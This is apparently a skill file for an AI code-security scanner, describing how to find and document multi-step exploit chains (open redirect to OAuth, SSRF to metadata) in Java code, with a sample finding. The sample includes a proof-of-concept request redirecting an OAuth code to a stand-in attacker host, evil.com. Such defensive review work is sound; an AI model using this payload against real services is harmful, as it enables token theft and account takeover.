# SKILL: sast-attack-chain — Exploit Chain & Compound Risk Analysis

## References

Load [`references/java-attack-chain.md`](references/java-attack-chain.md) at the start of this skill for common chain archetypes (open redirect→OAuth, SSRF→metadata, deserialization→RCE, path traversal→config read, JWT secret→token forge, mass assignment→privilege escalation), chain validation checklist, severity escalation rules, and taint path documentation format.

## Purpose

Identify cases where individually moderate findings combine into a higher-impact exploit chain. This skill reads Phase 2 findings and source context, then reasons like a security researcher about attacker progression.

Do not inflate severity without a concrete chain. Each chain must identify the starting access level, every required step, and the final impact.

---

## Phase 1: Inputs

Read:

- `.github/sast-context.md`
- `.github/sast-findings.jsonl`
- source files referenced by existing findings
- security configuration and endpoint mappings

If no findings exist yet, run this as a hypothesis pass over high-risk entry points and record only coverage notes unless a complete chain is confirmed.

---

## Phase 2: Chain Patterns

### 2.1 — Public Endpoint to Sensitive Internal Action

Look for:

- public endpoint accepts URL, path, ID, or expression
- service uses that value to reach internal service, file, admin API, or database
- response leaks data or changes state

Examples:

- open redirect + OAuth callback confusion
- SSRF + cloud metadata access
- path traversal + secret file read
- IDOR + exported PII

### 2.2 — Authenticated Low-Privilege to Admin Impact

Look for:

- user-controlled `role`, `tenantId`, `ownerId`, `status`, `price`, or approval fields
- missing object ownership checks
- mass assignment into entity followed by save
- admin-only service callable from non-admin endpoint

### 2.3 — Injection to Credential or Token Theft

Look for:

- SQLi exposing password reset tokens, API keys, session IDs, OAuth tokens
- template injection reading environment variables or config
- XXE reading local config or cloud credentials
- deserialization reaching filesystem/network gadgets

### 2.4 — Weak Secret to Auth Bypass

Look for:

- hardcoded JWT/HMAC/session signing keys
- weak crypto in remember-me tokens
- predictable password reset or invitation tokens
- insecure random used for auth-sensitive values

### 2.5 — Parser Confusion to Validation Bypass

Look for:

- URL validation accepts one host while client follows another
- path validation checks raw input before decoding
- redirect validation allows protocol-relative URLs
- extension/content-type check bypass before file processing

---

## Phase 3: Chain Validation

For each proposed chain, document:

```text
Attacker: unauthenticated | authenticated user | low-privileged tenant user | admin
Step 1: source and endpoint
Step 2: intermediate primitive gained
Step 3: second sink or trust-boundary crossing
Impact: data read, code execution, privilege escalation, account takeover, tenant breakout
Required conditions: config, roles, feature flags, deployment assumptions
Evidence: file:line for every step
```

Reject the chain if any step depends on speculation that cannot be tied to code or configuration.

---

## Phase 4: Severity Adjustment

Escalate a chain when:

- all steps are reachable by the same attacker
- the chain crosses privilege or tenant boundaries
- the first step is unauthenticated
- the final impact is RCE, auth bypass, sensitive data exfiltration, or financial/state manipulation

Do not escalate when:

- one step requires admin access already
- steps require incompatible roles or tenants
- the second primitive is not reachable in the same deployment
- impact is purely theoretical

---

## Finding Format

Follow the canonical format from `copilot-instructions.md`. For chains, use `taint_path` to document each step with file and line evidence. Example:

```
### [CRITICAL] Attack Chain — Open Redirect → OAuth Token Hijack

**ID:** CHAIN-001
**File:** `src/main/java/com/example/AuthController.java:78`
**CWE:** CWE-601 | **OWASP:** A01:2021-Broken Access Control
**CVSS (estimated):** 9.3 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)
**Confidence:** High
**Skill:** `sast-attack-chain`

**Taint Path:**
`Step 1: Attacker crafts OAuth login URL with returnTo=https://evil.com` → `AuthController.login(returnTo) (AuthController.java:78)` — open redirect (REDIRECT-001) → `Step 2: OAuth server redirects tokens to returnTo URL` → `AuthController.oauthCallback stores token in cookie (AuthController.java:112)` — token sent to attacker via redirect → `Step 3: Attacker replays token to access account`

**Vulnerable Code:**
```java
// Step 1: Open redirect (AuthController.java:78)
response.sendRedirect(returnTo);  // no host validation

// Step 2: OAuth flow — redirect_uri derived from returnTo
String redirectUri = buildRedirectUri(returnTo);  // (AuthController.java:95)
oauthClient.authorize(redirectUri);
```

**Why Exploitable:**
The open redirect (REDIRECT-001) allows an attacker to redirect the OAuth `redirect_uri` to their server. The OAuth server sends the authorization code to the attacker's URL, which can be exchanged for an access token giving full account control. Both steps are reachable from a single unauthenticated HTTP request.

**Proof-of-Concept:**
```http
GET /login?returnTo=https://evil.com/capture HTTP/1.1
# → OAuth redirects code to https://evil.com/capture?code=AUTH_CODE
# → Attacker exchanges code for token at /oauth/token
```

**Remediation:**
Fix the root cause (open redirect): validate `returnTo` against an allowlist of same-origin paths before using it as `redirect_uri`. Also register explicit `redirect_uri` values in the OAuth server configuration.

**References:** https://cwe.mitre.org/data/definitions/601.html, OWASP A01:2021
```

Use skill value `sast-attack-chain`. Recommended ID prefix: `CHAIN-NNN`.
Use the CWE of the dominant root cause: `CWE-863` (authz chains), `CWE-918` (SSRF chains), `CWE-22` (traversal chains), `CWE-89` (SQLi chains), `CWE-200` (info exposure chains).

JSONL line (append to `.github/sast-findings.jsonl`):
```json
{"id":"CHAIN-001","skill":"sast-attack-chain","cwe":"CWE-601","owasp":"A01:2021-Broken Access Control","severity":"Critical","confidence":"High","file":"src/main/java/com/example/AuthController.java","line":78,"method":"login","class":"com.example.AuthController","evidence":"response.sendRedirect(returnTo);","sink":"OAuth token delivered to attacker-controlled redirect_uri","source":"GET /login?returnTo= (unauthenticated)","taint_path":[{"step":"Open redirect allows attacker-controlled redirect_uri","file":"src/main/java/com/example/AuthController.java","line":78},{"step":"OAuth server sends auth code to attacker URL","file":"src/main/java/com/example/AuthController.java","line":95}],"sanitizer_present":false,"sanitizer_detail":"","remediation":"Validate returnTo against same-origin allowlist before using as OAuth redirect_uri; register explicit redirect URIs in OAuth config","references":["https://cwe.mitre.org/data/definitions/601.html"],"false_positive_indicators":["OAuth server enforces strict redirect_uri allowlist independently"],"duplicate_of":null}
```

---

## Self-Contained Check

This skill is most valuable after other Phase 2 skills have emitted findings. If run earlier, treat it as a chain-hypothesis pass and avoid confirmed output unless every step is directly verified.
